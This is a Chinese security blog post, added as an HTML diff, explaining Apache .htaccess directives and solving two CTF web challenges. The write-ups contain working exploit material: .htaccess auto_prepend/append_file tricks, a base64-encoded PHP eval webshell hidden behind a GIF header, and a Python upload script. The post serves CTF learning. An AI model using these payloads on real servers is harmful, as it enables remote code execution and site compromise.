@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="基于 .htaccess 文件的强大配置功能，本文将介绍其常见的使用方式，包括自定义错误页面、文件类型处理以及如何通过巧妙配置实现安全漏洞利用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="htaccess文件的相关使用">
+<meta property="og:url" content="http://example.com/2025/01/19/htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="Qwen&#39;s blog">
+<meta property="og:description" content="基于 .htaccess 文件的强大配置功能，本文将介绍其常见的使用方式，包括自定义错误页面、文件类型处理以及如何通过巧妙配置实现安全漏洞利用。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-01-19T05:56:43.000Z">
+<meta property="article:modified_time" content="2025-04-27T15:01:23.620Z">
+<meta property="article:author" content="Qwen">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2025/01/19/htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BD%BF%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>htaccess文件的相关使用 | Qwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Qwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/19/htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BD%BF%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_1.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          htaccess文件的相关使用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-19 13:56:43" itemprop="dateCreated datePublished" datetime="2025-01-19T13:56:43+08:00">2025-01-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-27 23:01:23" itemprop="dateModified" datetime="2025-04-27T23:01:23+08:00">2025-04-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>基于 <code>.htaccess</code> 文件的强大配置功能，本文将介绍其常见的使用方式，包括自定义错误页面、文件类型处理以及如何通过巧妙配置实现安全漏洞利用。</p>
+<span id="more"></span>
+
+<p><span style="color:blue;">注意：</span><strong>.htaccess中有 # 单行注释，且支持 \ 拼接上下两行。</strong></p>
+<h2 id="启动-htaccess文件的使用"><a href="#启动-htaccess文件的使用" class="headerlink" title="启动.htaccess文件的使用"></a>启动.htaccess文件的使用</h2><p>Apache中修改配置文件httpd.conf，找到有关控制.htaccess文件的指令AllowOverride，进行如下设置：</p>
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">AllowOverride <span class="keyword">All</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="常见使用方式"><a href="#常见使用方式" class="headerlink" title="常见使用方式"></a>常见使用方式</h2><h3 id="自定义错误页面"><a href="#自定义错误页面" class="headerlink" title="自定义错误页面"></a><span style="color:blue;">自定义错误页面</span></h3><p>Apache主配置文件中修改<code>&lt;Directory&gt;</code>指令块。</p>
+<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">用于定义特定目录的配置，确保<span class="keyword">Require</span> <span class="literal">all</span> granted允许所有用户访问</span><br><span class="line">&lt;Directory /&gt;</span><br><span class="line">    Options +Indexes +FollowSymLinks +ExecCGI</span><br><span class="line">    AllowOverride <span class="literal">All</span></span><br><span class="line">    <span class="keyword">Order</span> allow,deny</span><br><span class="line">    Allow from <span class="literal">all</span></span><br><span class="line">    <span class="keyword">Require</span> <span class="literal">all</span> granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
+
+<p>语法格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ErrorDocument 401 /error/401.php</span><br><span class="line">ErrorDocument 403 /error/403.php</span><br><span class="line">ErrorDocument 404 /error/404.php</span><br><span class="line">ErrorDocument 500 /error/500.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="Handler和Type"><a href="#Handler和Type" class="headerlink" title="Handler和Type"></a><span style="color:blue;">Handler和Type</span></h3><p><code>MIME</code>类型可以帮助服务器和客户端识别文件的类型，而不仅仅依赖文件扩展名。<code>application/x-httpd-php</code>是一个特定的处理器名称，表示将这些文件交给PHP模块处理。</p>
+<p><code>ForceType</code>指令用于<strong>强制指定文件的MIME类型</strong>。<code>SetHandler</code>指令用于为匹配的文件<strong>指定一个处理器</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;exp.jpg&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">#&lt;FilesMatch&gt; 是一个指令块，用于对匹配特定模式的文件应用配置指令。</span><br><span class="line">    #参数 &quot;exp.jpg&quot; 是一个正则表达式，用于匹配文件名。在这里，它匹配文件名正好为 exp.jpg 的文件。</span><br></pre></td></tr></table></figure>
+
+<p><code>AddType</code>指令用于将<strong>特定的MIME类型</strong>与<strong>文件扩展名</strong>关联起来。<code>AddHandler</code>用于将<strong>处理器</strong>与<strong>文件扩展名</strong>关联起来。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jt</span><br><span class="line">#拓展名为.jt的文件也可以执行php代码</span><br><span class="line">AddHandler cgi-script .hhh</span><br><span class="line">#拓展名为.hhh的文件作为CGI脚本来处理</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a><span style="color:blue;">php_value</span></h3><p>在主文件解析前后，自动将指定文件当作php文件解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file 1.txt   在主文件解析前，自动解析1.txt的内容</span><br><span class="line">php_value auto_append_file 1.txt    在主文件解析后，自动解析1.txt的内容</span><br></pre></td></tr></table></figure>
+
+<p>当前目录下有php文件时，.htaccess把自己指定当作php文件处理：(# 是.htaccess中的单行注释)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15847702/5821101">https://blog.51cto.com/u_15847702&#x2F;5821101</a></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF2020]easyphp">(羊城杯2020)easyphp</a></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 将./下不是index.php的文件删除</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># 将./下不是index.php的文件删除</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>思路：</p>
+<p>​	<strong>因为index.php会将所有不是index.php的文件都删除，所以这里要想到利用.htaccess的php_value auto_prepend_file来攻击，其可以使任意file在主文件即index.php解析前被当作php文件解析。</strong></p>
+<p>要利用的poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line">#&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>content过滤了file，解决思路：可以将file写成fil%0Ae，使fil在上一行，e在下一行，再利用 \ 连接上下两行，如fil%0Ae即可。</li>
+<li>在content后添加<code>\nHello, world</code>不符合.htaccess格式，解决思路：在末尾加一个 \ 将后加的\n给转义掉。</li>
+</ol>
+<p>最后payload如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?content=php_value auto_prepend_fil\%<span class="number">0</span>Ae .htaccess%<span class="number">0</span>A%<span class="number">23</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /&#x27;</span>);<span class="meta">?&gt;</span>\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>
+
+<p>题目：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SUCTF%202019]EasyWeb">SUCTF 2019EasyWeb</a></p>
+<p>源码：</p>
+<p>怎么让<code>.htaccess</code>文件被当作图片呢？</p>
+<p>法一：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">在文件前加</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> width 1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> height 1337</span></span><br></pre></td></tr></table></figure>
+
+<p>法二：</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">在.htaccess前添加<span class="keyword">x</span><span class="number">00</span><span class="keyword">x</span><span class="number">00</span><span class="keyword">x</span><span class="number">8</span>ax<span class="number">39</span><span class="keyword">x</span><span class="number">8</span>ax<span class="number">39</span>(要在十六进制编辑器中添加，或者使用python的bytes类型)</span><br><span class="line"><span class="keyword">x</span><span class="number">00</span><span class="keyword">x</span><span class="number">00</span><span class="keyword">x</span><span class="number">8</span>ax<span class="number">39</span><span class="keyword">x</span><span class="number">8</span>ax<span class="number">39</span> 是wbmp文件的文件头</span><br><span class="line">.htaccess中以<span class="number">0x00</span>开头的同样也是注释符，所以不会影响.htaccess</span><br></pre></td></tr></table></figure>
+
+<p>由于文件内容过滤了<code>&lt;?</code>，我们就不能写php代码了，可以将马进行<code>base64</code>编码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a12		</span><br><span class="line"><span class="comment">#12是为了补足8个字节，满足base64编码的规则</span></span><br><span class="line">PD9waHAgZXZhbCgkX1JFUVVFU1RbJ3NoJ10pOz8+</span><br><span class="line"><span class="comment">//&lt;?php eval($_REQUEST[&#x27;sh&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然我们还需要对<code>base64</code>编码的马进行解码，可以利用伪协议<code>php://filter</code>将<code>1.jt</code>文件进行<code>base64</code>解码，利用<code>auto_append_file</code>来包含解码后的文件<code>1.jt</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application/x-httpd-php .jt</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./1.jt</span><br></pre></td></tr></table></figure>
+
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Htaccess</span>(<span class="params">url,data</span>):</span><br><span class="line">    htaccess = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .jt</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./1.jt&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;.htaccess&quot;</span>,htaccess,<span class="string">&quot;image/jpeg&quot;</span>)&#125;</span><br><span class="line">    res = requests.post(url=url,data=data,files=files)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Shell</span>(<span class="params">url,data</span>):</span><br><span class="line">    shell = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;sh&#x27;]);?&gt;&quot;</span>)</span><br><span class="line">    files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;1.jt&quot;</span>,shell,<span class="string">&quot;image/jpeg&quot;</span>)&#125;</span><br><span class="line">    res = requests.post(url=url,data=data,files=files)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://a7c9df93-30ed-44c8-ba5b-3287d8f220b6.node5.buuoj.cn:81/&#x27;</span>+payload</span><br><span class="line">    post_data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">    Htaccess(url,post_data)</span><br><span class="line">    Shell(url,post_data)</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/11/19/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E5%9C%BA/" rel="prev" title="渗透测试靶机vulnhub_AI-WEB-1.0通关记录">
+      <i class="fa fa-chevron-left"></i> 渗透测试靶机vulnhub_AI-WEB-1.0通关记录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/02/06/web%E5%AE%89%E5%85%A8-phpsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="PHPSession反序列化">
+      PHPSession反序列化 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+      <!-- require APlayer -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+      <!-- require MetingJS-->
+      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+      <meting-js
+        auto="https://y.qq.com/n/yqq/playlist/9454682797.html#stat=y_new.playlist.pic_click">
+      </meting-js>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8-htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">启动.htaccess文件的使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">2.</span> <span class="nav-text">常见使用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2"><span class="nav-number">2.1.</span> <span class="nav-text">自定义错误页面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Handler%E5%92%8CType"><span class="nav-number">2.2.</span> <span class="nav-text">Handler和Type</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-value"><span class="nav-number">2.3.</span> <span class="nav-text">php_value</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">例题</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Qwen"
+      src="/images/avatar_1.jpg">
+  <p class="site-author-name" itemprop="name">Qwen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Qwen</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
